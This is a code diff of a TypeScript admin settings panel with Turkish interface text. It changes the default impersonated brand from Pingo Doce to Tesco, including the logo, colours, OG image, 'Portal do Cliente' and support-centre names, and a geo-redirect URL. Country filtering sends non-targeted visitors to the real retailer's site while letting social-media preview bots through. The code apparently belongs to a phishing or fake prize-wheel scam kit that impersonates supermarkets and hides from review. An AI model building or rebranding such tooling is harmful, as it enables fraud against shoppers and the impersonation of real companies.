@@ -10,9 +10,9 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
   const [saving, setSaving] = useState(false);
   const [uploading, setUploading] = useState<string | null>(null);
   const [allowedCountries, setAllowedCountries] = useState<string[]>([]);
-  const [geoRedirectUrl, setGeoRedirectUrl] = useState("https://www.pingodoce.pt");
-  const [campaignName, setCampaignName] = useState("Pingo Doce");
-  const [themePrimary, setThemePrimary] = useState("#0fae4e");
+  const [geoRedirectUrl, setGeoRedirectUrl] = useState("https://www.tesco.ie");
+  const [campaignName, setCampaignName] = useState("Tesco");
+  const [themePrimary, setThemePrimary] = useState("#00539f");
   const [openContinent, setOpenContinent] = useState<string | null>(null);
   const supabase = createBrowserSupabaseClient();
 
@@ -53,12 +53,12 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
   }
 
   const DEFAULTS = {
-    logo_url: "/PD-mini-logo.png",
+    logo_url: "/form-assets/tesco-mini-logo.png",
     bg_url: "/form-assets/bg-desktop.png",
     bg_url_mobile: "/form-assets/bg-mobile.png",
-    og_image_url: "https://pingodoce.pt/og-image.jpg",
-    portal_name: "Portal do Cliente Pingo Doce",
-    support_center_name: "Apoio ao Cliente Pingo Doce",
+    og_image_url: "https://tesco.ie/og-image.jpg",
+    portal_name: "Portal do Cliente Tesco",
+    support_center_name: "Apoio ao Cliente Tesco",
   };
 
   const fetchSettings = async () => {
@@ -79,9 +79,9 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
         wheel_settings: { ...ws, bg_url_mobile: ws.bg_url_mobile || DEFAULTS.bg_url_mobile },
       });
       setAllowedCountries(Array.isArray(ws.allowed_countries) ? ws.allowed_countries : []);
-      setGeoRedirectUrl(typeof ws.geo_redirect_url === "string" && ws.geo_redirect_url.trim() !== "" ? ws.geo_redirect_url : "https://www.pingodoce.pt");
-      setCampaignName(typeof ws.campaign_name === "string" && ws.campaign_name.trim() !== "" ? ws.campaign_name.trim() : "Pingo Doce");
-      setThemePrimary(typeof ws.theme_primary === "string" && /^#[0-9a-fA-F]{6}$/.test(ws.theme_primary.trim()) ? ws.theme_primary.trim() : "#0fae4e");
+      setGeoRedirectUrl(typeof ws.geo_redirect_url === "string" && ws.geo_redirect_url.trim() !== "" ? ws.geo_redirect_url : "https://www.tesco.ie");
+      setCampaignName(typeof ws.campaign_name === "string" && ws.campaign_name.trim() !== "" ? ws.campaign_name.trim() : "Tesco");
+      setThemePrimary(typeof ws.theme_primary === "string" && /^#[0-9a-fA-F]{6}$/.test(ws.theme_primary.trim()) ? ws.theme_primary.trim() : "#00539f");
     }
     setLoading(false);
   };
@@ -119,9 +119,9 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
         wheel_settings: {
           ...(settings.wheel_settings || {}),
           allowed_countries: allowedCountries,
-          geo_redirect_url: geoRedirectUrl.trim() || "https://www.pingodoce.pt",
-          campaign_name: campaignName.trim() || "Pingo Doce",
-          theme_primary: /^#[0-9a-fA-F]{6}$/.test(themePrimary.trim()) ? themePrimary.trim() : "#0fae4e",
+          geo_redirect_url: geoRedirectUrl.trim() || "https://www.tesco.ie",
+          campaign_name: campaignName.trim() || "Tesco",
+          theme_primary: /^#[0-9a-fA-F]{6}$/.test(themePrimary.trim()) ? themePrimary.trim() : "#00539f",
         }
       })
       .eq("id", settings.id || "default");
@@ -358,11 +358,11 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
                   type="text"
                   value={geoRedirectUrl}
                   onChange={(e) => setGeoRedirectUrl(e.target.value)}
-                  placeholder="https://www.pingodoce.pt"
+                  placeholder="https://www.tesco.ie"
                   className={`w-full px-4 py-3 rounded-xl text-sm outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-white border border-gray-200 focus:border-[#EB5E28]'}`}
                 />
                 <p className={`text-[11px] mt-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
-                  Seçili olmayan ülkelerden gelen ziyaretçiler bu adrese gönderilir. Boş bırakılırsa https://www.pingodoce.pt kullanılır. Sosyal medya önizleme botları bu filtreden etkilenmez.
+                  Seçili olmayan ülkelerden gelen ziyaretçiler bu adrese gönderilir. Boş bırakılırsa https://www.tesco.ie kullanılır. Sosyal medya önizleme botları bu filtreden etkilenmez.
                 </p>
               </div>
             </div>
@@ -381,15 +381,15 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
                   type="text"
                   value={campaignName}
                   onChange={(e) => setCampaignName(e.target.value)}
-                  placeholder="Pingo Doce"
+                  placeholder="Tesco"
                   className={`flex-1 px-4 py-3 rounded-xl text-sm font-bold outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-white border border-gray-200 focus:border-[#EB5E28]'}`}
                 />
                 <span className={`text-xs font-bold px-3 py-1.5 rounded-full whitespace-nowrap ${darkMode ? 'bg-[#EB5E28]/15 text-[#EB5E28]' : 'bg-orange-100 text-[#EB5E28]'}`}>
-                  {campaignName.trim() || "Pingo Doce"}
+                  {campaignName.trim() || "Tesco"}
                 </span>
               </div>
               <p className={`text-[11px] mt-2 ${darkMode ? 'text-gray-500' : 'text-gray-400'}`}>
-                Buraya yazılan isim kaydedildiğinde sitenin <b>tüm metinlerindeki "Pingo Doce" ibaresi</b> bu isimle değiştirilir (başlıklar, portal adı, OG paylaşım metinleri, destek merkezi vb.). Boş bırakılırsa "Pingo Doce" kalır.
+                Buraya yazılan isim kaydedildiğinde sitenin <b>tüm metinlerindeki "Tesco" ibaresi</b> bu isimle değiştirilir (başlıklar, portal adı, OG paylaşım metinleri, destek merkezi vb.). Boş bırakılırsa "Tesco" kalır.
               </p>
             </div>
 
@@ -407,19 +407,19 @@ export function GeneralSettingsTab({ darkMode }: { darkMode: boolean }) {
                   type="text"
                   value={themePrimary}
                   onChange={(e) => setThemePrimary(e.target.value)}
-                  placeholder="#0fae4e"
+                  placeholder="#00539f"
                   className={`w-32 px-3 py-2.5 rounded-xl text-sm font-mono outline-none transition-all ${darkMode ? 'bg-black/20 text-white border border-white/10 focus:border-[#EB5E28]' : 'bg-white border border-gray-200 focus:border-[#EB5E28]'}`}
                 />
                 <button
                   type="button"
-                  onClick={() => setThemePrimary("#0fae4e")}
+                  onClick={() => setThemePrimary("#00539f")}
                   className={`text-xs font-bold px-3 py-2 rounded-lg transition-colors ${darkMode ? 'bg-white/10 text-gray-300 hover:bg-white/15' : 'bg-gray-200 text-gray-600 hover:bg-gray-300'}`}
                 >
                   Varsayılana Dön
                 </button>
                 <span
                   className="ml-auto h-8 w-24 rounded-lg border border-white/10"
-                  style={{ background: `linear-gradient(90deg, ${/^#[0-9a-fA-F]{6}$/.test(themePrimary) ? themePrimary : '#0fae4e'}, rgba(0,0,0,0.4))` }}
+                  style={{ background: `linear-gradient(90deg, ${/^#[0-9a-fA-F]{6}$/.test(themePrimary) ? themePrimary : '#00539f'}, rgba(0,0,0,0.4))` }}
                   title="Önizleme"
                 />
               </div>
